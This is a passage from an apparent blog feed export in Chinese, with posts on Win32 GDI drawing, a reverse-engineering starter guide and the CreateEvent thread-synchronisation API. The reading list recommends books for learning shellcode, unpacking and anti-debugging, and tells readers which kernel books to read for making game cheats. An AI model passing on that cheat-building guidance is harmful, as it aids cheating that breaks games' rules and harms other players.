但是使用之前。需要知道我们要操作的步骤.</p>\n<ol>\n<li>\n<p>获取窗口句柄。也就是设备对象.</p>\n</li>\n<li>\n<p>获取窗口中的 DC 上下文。可以理解为获取指定窗口的绘图的那块内存.</p>\n</li>\n<li>\n<p>创建图形对象。要想绘制。那么首先就需要你自定义的一个绘制的东西才可以.</p>\n</li>\n<li>\n<p>关联图形对象跟 DC. 只要关联了。那么绘制的时候自动就使用你的图形对象了.</p>\n</li>\n<li>\n<p>进行你的绘图操作。这里就是你写的绘图代码了.</p>\n</li>\n<li>\n<p>释放资源。不管是窗口句柄也好. DC 也好。图形对象也好。都是内核对象。所以我们需要进行释放.</p>\n</li>\n</ol>\n<h2 id=\"具体api\"><a class=\"anchor\" href=\"#具体api\">#</a> 具体 API</h2>\n<ol>\n<li>获取指定窗口句柄   <code>FindWindowA/FindWindowW</code></li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HWND <span class=\"token function\">FindWindowA</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  LPCSTR lpClassName<span class=\"token punctuation\">,</span>              窗口类名<span class=\"token punctuation\">.</span>字符串<span class=\"token punctuation\">.</span> 可以用Spy<span class=\"token operator\">++</span>获取</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  LPCSTR lpWindowName           窗口名称</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>返回窗口句柄</pre></td></tr></table></figure><ol start=\"2\">\n<li>获取 DC 设备上下文  <code>GetDc()</code></li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HDC <span class=\"token function\">GetDC</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  HWND hWnd                    传入设备对象<span class=\"token punctuation\">.</span>也就是窗口句柄</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>创建图形对象</li>\n</ol>\n<p>PS: 创建图形对象。图形对象有很多。有画笔。画刷。等等.</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HPEN <span class=\"token function\">CreatePen</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span>      iStyle<span class=\"token punctuation\">,</span>              <span class=\"token comment\">// 创建笔的风格，意思就是你的画笔是实心的 还是虚线 还是其他.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span>      cWidth<span class=\"token punctuation\">,</span>              <span class=\"token comment\">// 笔的宽度。如果实心的。笔的宽度则自定义设置。如果其他。不能超过 1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  COLORREF color                <span class=\"token comment\">//RGB 的颜色。你的画笔是什么颜色的。是一串 16 进制可以在线取色</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>返回图形对象</pre></td></tr></table></figure><p>还有常用的。创建矩形区域.</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HRGN <span class=\"token function\">CreateRectRgn</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span> x1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> y1<span class=\"token punctuation\">,</span>                 <span class=\"token comment\">// 坐标</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> x2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> y2</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>具体使用可以查询 MSDN:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy9kZXNrdG9wL2dkaS93aW5kb3dzLWdkaQ==\">https://docs.microsoft.com/zh-cn/windows/desktop/gdi/windows-gdi</span> 代码使用例子<br />\n如果你安装了 MSDN 2001 版本。搜索 SelectObject 可以看到。图形对象有很多。并且告诉你相应的 API</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>Bitmap  位图。后面是操作的 API</p>\n<p>Brush     画刷</p>\n<p>字体</p>\n<p>笔</p>\n<p>矩形</p>\n<ol start=\"4\">\n<li>关联 DC 跟图形对象</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HGDIOBJ <span class=\"token function\">SelectObject</span><span class=\"token punctuation\">(</span>  HDC hdc<span class=\"token punctuation\">,</span>          <span class=\"token comment\">// handle to DC</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>HGDIOBJ hgdiobj   <span class=\"token comment\">// handle to object);</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>写你想要绘制的代码</li>\n</ol>\n<p>这里如果是画线。则用  <code>LineTo(Hdc,x,y)</code>  这个 API  给定一个 DC. 给个 x y 坐标。则可以绘制.</p>\n<p>当然如果指定在哪里开始绘制则用 <code>MoveToEx</code>  指定起始位置.</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token function\">MoveToEx</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  HDC     hdc<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span>     x<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span>     y<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  LPPOINT lppt</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>释放资源</li>\n</ol>\n<p>释放资源很简单了，如果是图形对象，同一使用 <code>DeleteObject(对象)</code>  进行删除.</p>\n<p>如果是 <code>DC</code> , 如果是创建的 <code>DC</code> , 则用 <code>DeleteDc(DC对象)</code>  来进行删除.</p>\n<p>如果是获取的 <code>DC</code>  则用 <code>ReleaseDc(Dc对象)</code>  来进行删除.</p>\n<p>题外话 windows 程序中还有一个 API. 可以获取 DC 中默认的图形对象.</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 该函数检索预定义的备用笔、刷子、字体或者调色板的句柄</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>HGDIOBJ <span class=\"token function\">GetStockObject</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span>  fnObject                  <span class=\"token comment\">// 对象的类型。你想从 DC 中获取什么对象类型.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>详情见百科<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9HZXRTdG9ja09iamVjdA==\"> https://baike.baidu.com/item/GetStockObject</span></p>\n<p>图像类型如果是 <code>DC_BRUSH</code>  则是获取纯色刷。就不用自己创建色刷了。可以通过操作色刷的 API 进行操作.</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>COLORREF <span class=\"token function\">SetDCBrushColor</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  HDC      hdc<span class=\"token punctuation\">,</span>         <span class=\"token comment\">// 设备上下文环境句柄。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  COLORREF color        <span class=\"token comment\">//RGB 颜色</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"绘制图形\"><a class=\"anchor\" href=\"#绘制图形\">#</a> 绘制图形</h1>\n<h2 id=\"实例代码\"><a class=\"anchor\" href=\"#实例代码\">#</a> 实例代码</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">//1. 设备对象 就是你要把东西画在什么地方</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// 这里使用的是桌面的句柄</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tHWND hwnd <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>HWND<span class=\"token punctuation\">)</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\">//2.DC 设备上下文对象</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">// 把它看成一块内存，画在内存中，然后再打印到屏幕上</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">// 获取设备上下文对象</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tHDC hdc <span class=\"token operator\">=</span> <span class=\"token function\">GetDC</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">//3. 图形对象</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">// 获取默认画刷 DC_BRUSH 可以设置颜色</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tHBRUSH hbrush <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>HBRUSH<span class=\"token punctuation\">)</span><span class=\"token function\">GetStockObject</span><span class=\"token punctuation\">(</span>DC_BRUSH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token comment\">//4. 关联</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token function\">SelectObject</span><span class=\"token punctuation\">(</span>hdc<span class=\"token punctuation\">,</span> hbrush<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token comment\">//5. 开始画矩形</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token comment\">// 设置画刷颜色</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">SetDCBrushColor</span><span class=\"token punctuation\">(</span>hdc<span class=\"token punctuation\">,</span> <span class=\"token function\">RGB</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token comment\">// 画矩形</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">Rectangle</span><span class=\"token punctuation\">(</span>hdc<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token comment\">//6. 销毁对象 释放资源</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">DeleteObject</span><span class=\"token punctuation\">(</span>hbrush<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token function\">ReleaseDC</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">,</span> hdc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaUJpbmFyeS9wLzk1ODAyNjguaHRtbA==\">https://www.cnblogs.com/iBinary/p/9580268.html</span></p>\n",
            "tags": [
                "Win32",
                "设备对象",
                "DC设备上下文",
                "图形对象"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Windows%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/",
            "url": "https://self-ferry.github.io/Windows%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/",
            "title": "Windows逆向工程入门指南",
            "date_published": "2021-06-18T23:52:01.000Z",
            "content_html": "<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMUdKNDExWTd1YQ==\">https://www.bilibili.com/video/BV1GJ411Y7ua</span></p>\n<h1 id=\"windows逆向工程入门指南\"><a class=\"anchor\" href=\"#windows逆向工程入门指南\">#</a> Windows 逆向工程入门指南</h1>\n<p>对小白指了条路。</p>\n<h2 id=\"思维导图截图\"><a class=\"anchor\" href=\"#思维导图截图\">#</a> 思维导图截图</h2>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image012.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image013.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image014.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image017.png\" alt=\"\" /></p>\n<hr />\n<p><img data-src=\"image018.png\" alt=\"\" /></p>\n<hr />\n<h2 id=\"推荐书籍\"><a class=\"anchor\" href=\"#推荐书籍\">#</a> 推荐书籍</h2>\n<p>Windows 程序设计<br />\n Windows 核心编程<br />\n MFC 程序设计</p>\n<p>算法导论</p>\n<p>Windows 环境下 32 位汇编语言程序设计</p>\n<p>《x86_x64 体系探索及编程》</p>\n<p>taocp 计算机程序设计艺术</p>\n<p>算法竞赛</p>\n<p>大话数据结构</p>\n<p>PE 权威指南</p>\n<p>逆向工程权威指南  【内容杂，不适合入门】</p>\n<p>软件调试 【张银奎】</p>\n<p>Windows 高级调试</p>\n<p>深入浅出密码学</p>\n<p>0day 安全：软件漏洞分析技术    【学习 shellcode 的编写】</p>\n<p>灰帽黑客【学习 shellcode 编写】</p>\n<p>恶意代码分析【学习反调试和反虚拟机技术】</p>\n<p>加密与解密第四版【学习加壳、脱壳技术】</p>\n<p>恶意代码分析【病毒分析、恶意代码入门】</p>\n<p>0day 安全：软件漏洞分析技术【学习漏洞相关技术】</p>\n<p>漏洞战争</p>\n<p>模糊测试 强制发掘安全漏洞的利器</p>\n<p>Windows 内核原理与实现【看完 Windows 内核安全与驱动开发，缺一些理论，需要看这本书】<br />\n深入理解 Windows 操作系统【也是理论。原版最好，中文翻译有些问题】</p>\n<p>搞挂<br />\n 1.Windows 内核安全与驱动开发【安全开发对抗】<br />\n2.Windows 内核原理与实现【着急做挂的话，这本可以不看】<br />\n3.Windows 内核设计思想【搞挂的要看这本书】</p>\n<p>虫术 【Python 爬虫】</p>\n<h2 id=\"一些靠谱的招聘网站\"><a class=\"anchor\" href=\"#一些靠谱的招聘网站\">#</a> 一些靠谱的招聘网站</h2>\n<p>看雪论坛<br />\n吾爱破解<br />\n FreeBuf<br />\nBoss 直聘<br />\n智联招聘<br />\n Tools<br />\n 安全圈 info</p>\n",
            "tags": [
                "Windows逆向",
                "Windows逆向"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E4%BA%8B%E4%BB%B6/",
            "url": "https://self-ferry.github.io/Win%E4%BA%8B%E4%BB%B6/",
            "title": "Win事件与线程同步",
            "date_published": "2021-06-03T04:56:46.000Z",
            "content_html": "<h1 id=\"通知类型\"><a class=\"anchor\" href=\"#通知类型\">#</a> 通知类型</h1>\n<p>创建通知类型</p>\n<h2 id=\"createevent函数\"><a class=\"anchor\" href=\"#createevent函数\">#</a> CreateEvent 函数</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HANDLE <span class=\"token function\">CreateEvent</span><span class=\"token punctuation\">(</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  LPSECURITY_ATTRIBUTES lpEventAttributes<span class=\"token punctuation\">,</span> <span class=\"token comment\">// SD  </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  BOOL bManualReset<span class=\"token punctuation\">,</span>                       <span class=\"token comment\">// reset type  </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  BOOL bInitialState<span class=\"token punctuation\">,</span>                      <span class=\"token comment\">// initial state  </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  LPCTSTR lpName                           <span class=\"token comment\">// object name  </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"参数解析\"><a class=\"anchor\" href=\"#参数解析\">#</a> 参数解析</h2>\n<h3 id=\"lpeventattributes\"><a class=\"anchor\" href=\"#lpeventattributes\">#</a> lpEventAttributes</h3>\n<p>指向 <code>SECURITY_ATTRIBUTES</code>  结构体，此结构体决定函数的返回句柄是否可以让子进程继承。如果这个参数为 <code>NULL</code> ，这个句柄是不能继承的。一般情况下，这个参数设置为 <code>NULL</code> 。</p>\n<h3 id=\"bmanualreset\"><a class=\"anchor\" href=\"#bmanualreset\">#</a> bManualReset</h3>\n<p>指定将创建的 <code>EVENT</code>  是自动复位还是手动复位。如果为 <code>TRUE</code> ，需要用 <code>ResetEvent(HANDLE)</code>  函数手动复位状态为无信号，即一旦改 <code>EVENT</code>  被设置成有信号，则它会一直等到 <code>ResetEvent</code>  调用时才为无信号状态。如果为 <code>FALSE</code> ，当一个有信号的等待线程被释放后，系统会自动复位状态为无信号状态。</p>\n<h3 id=\"binitialstate\"><a class=\"anchor\" href=\"#binitialstate\">#</a> bInitialState</h3>\n<p>指定事件对象的初始状态。如果为 <code>TRUE</code> ，初始状态为有信号，否则为无信号。</p>\n<h3 id=\"lpname\"><a class=\"anchor\" href=\"#lpname\">#</a> lpName</h3>\n<p>事件对象的名称，以字符串表示。名称的长度受 <code>MAX_PATH</code>  的限制，名称是大小写敏感的。</p>\n<p>如果 <code>lpName</code>  匹配一个存在的命名的事件对象，函数将请求 <code>EVENT_ALL_ACCESS</code>  来访问存在的对象。在这种情况下， <code>bManualReset</code>  和 <code>bInitialState</code>  被忽略，因为这两个参数已经被存在的事件设置。如果 <code>lpEventAttributes</code>  参数不为 <code>NULL</code> ，这个参数可以决定是否句柄被继承，但是它的安全描述 <code>（security-descriptor）</code> 成员被忽略。</p>\n<p>如果 <code>lpName</code>  为 <code>NULL</code> ，创建一个没有名称的事件。</p>\n<p>如果 <code>lpName</code>  匹配一个存在的 <code>semaphore</code> , <code>mutex</code> ,  <code>waitable timer</code> ,  <code>job</code>  或者 <code>file-mapping</code>  对象的名称，函数调用失败， <code>GetLastError</code>  函数返回 <code>ERROR_INVALID_HANDLE</code> 。由于这些对象共享相同的命名空间，才导致这种情况的发生。</p>\n<h2 id=\"返回值\"><a class=\"anchor\" href=\"#返回值\">#</a> 返回值</h2>\n<p>函数返回句柄，该句柄具有 <code>EVENT_ALL_ACCESS</code>  权限去访问新的事件对象，同时它可以在任何需要事件对象句柄的函数中使用。</p>\n<h2 id=\"事件的初始状态\"><a class=\"anchor\" href=\"#事件的初始状态\">#</a> 事件的初始状态</h2>\n<p>事件对象的初始状态由 <code>bInitialState</code>  参数指定，用 <code>SetEvent函数</code> 可以设置对象为有信号状态，用 <code>ResetEvent函数</code> 可以设置对象为无信号状态。</p>\n<p><span class=\"label info\">应用:</span><br />\n 调用过程中的任何线程，都可以在一个等待函数中指定事件对象句柄。当指定的对象的状态为有信号时，单对象等待函数（例如 WaitForSingleObject）返回。对于多对象等待函数（例如 WaitForMultipleObjects），可以指定为任意或所有指定的对象被置为有信号状态。当等待函数返回时，等待线程将被释放去继续它的执行。</p>\n<p>当一个手动复原的事件对象的状态被置为有信号状态时，该对象将一直保持有信号状态，直至明确调用 <code>ResetEvent</code>  函数将其置为无符号状态。</p>\n<p>注意： <span class=\"label danger\">当事件对象被设置为有信号状态时，任何数量的等待线程或者随后等待的线程都会被释放。</span></p>\n<p><code>SetEvent(HANDLE hEvent);</code> <br />\n <code>ResetEvent(HANDLE hEvent);</code></p>\n<h2 id=\"实例代码\"><a class=\"anchor\" href=\"#实例代码\">#</a> 实例代码</h2>\n<p>通过修改 <code>bManualReset</code>  和 <code>bInitialState</code>  来深刻理解 <code>CreateEvent</code>  函数</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span>  </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>DWORD WINAPI <span class=\"token function\">ThreadProc1</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>DWORD WINAPI <span class=\"token function\">ThreadProc2</span><span class=\"token punctuation\">(</span>LPVOID lpParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>HANDLE hEvent <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>HANDLE hThread1 <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>HANDLE hThread2 <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> args<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    hEvent <span class=\"token operator\">=</span> <span class=\"token function\">CreateEvent</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> TRUE<span class=\"token punctuation\">,</span> TRUE<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 使用手动重置为无信号状态，初始化时有信号状态</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    从结果中看，执行完线程 1 又执行了线程 2.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    hEvent 一直处于有信号状态，无论线程 1 是否释放，hEvent 仍处于有信号状态，所以线程 2 也正常执行了。</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\">//hEvent = CreateEvent (NULL, FALSE, FALSE, NULL);// 使用自动重置为无信号状态，初始化为无信号状态</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    由于调用 SetEvent，hEvent 为有信号状态，线程 1 正常执行，又由于调用完线程 1 后，hEvent 自动重置为无信号状态，所以线程 2 只能在等待，直到主线程退出。</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    修改：线程 1 中的 SetEvent (hEvent); 的注释去掉，再运行，则线程 1 和线程 2 都会执行。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token comment\">//hEvent = CreateEvent (NULL, FALSE, TRUE, NULL); // 当一个等待线程被释放时，自动重置为无信号状态，初始是有信号状态  </span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    从执行结果中分析，执行了线程 1，线程 2 一直在等待，直到主线程结束。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    由于 hEvent = CreateEvent (NULL, FALSE, TRUE, NULL)，当一个等待线程被释放时，自动重置为无信号状态，初始是有信号状态</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    初始执行线程 1 的时候，hEvent 是有信号的，所以线程 1 正常执行；又由于 bManualReset=FALSE，所以执行完线程 1 后，hEvent 自动重置为无信号状态</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    WaitForSingleObject (hEvent,INFINITE); 函数一直在等待 hEvent 变为有信号状态，但是当主线程执行完，还没等待到，线程 2 程序一直没有走下去。</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token 